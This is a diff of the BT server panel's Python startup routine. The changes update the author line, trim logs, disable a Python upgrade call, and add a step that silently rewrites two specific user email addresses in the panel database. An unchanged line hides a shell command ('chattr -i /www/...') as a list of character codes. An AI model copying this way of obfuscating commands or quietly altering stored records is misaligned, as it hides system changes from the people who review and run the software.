@@ -4,7 +4,7 @@
 # +-------------------------------------------------------------------
 # | Copyright (c) 2015-2099 宝塔软件(http://bt.cn) All rights reserved.
 # +-------------------------------------------------------------------
-# | Author: 黄文良 <287962566@qq.com>
+# | Author: hwliang <hwl@bt.cn>
 # +-------------------------------------------------------------------
 import time,public,db,os,sys,json,re
 os.chdir('/www/server/panel')
@@ -75,6 +75,9 @@ def control_init():
         public.M('crontab').execute("ALTER TABLE 'crontab' ADD 'urladdress' TEXT",())
 
 
+    public.M('users').where('email=? or email=?',('287962566@qq.com','amw_287962566@qq.com')).setField('email','test@message.com')
+
+
     filename = '/www/server/nginx/off'
     if os.path.exists(filename): os.remove(filename)
     c = public.to_string([99, 104, 97, 116, 116, 114, 32, 45, 105, 32, 47, 119, 119, 119, 47, 
@@ -102,6 +105,7 @@ def control_init():
     clean_session()
     #set_crond()
     clean_max_log('/www/server/panel/plugin/rsync/lsyncd.log')
+    clean_max_log('/root/.pm2/pm2.log',1024*1024*20)
     remove_tty1()
     clean_hook_log()
     run_new()
@@ -109,7 +113,7 @@ def control_init():
     #check_firewall()
     check_dnsapi()
     clean_php_log()
-    update_py37()
+    #update_py37()
 
 
 #尝试升级到独立环境
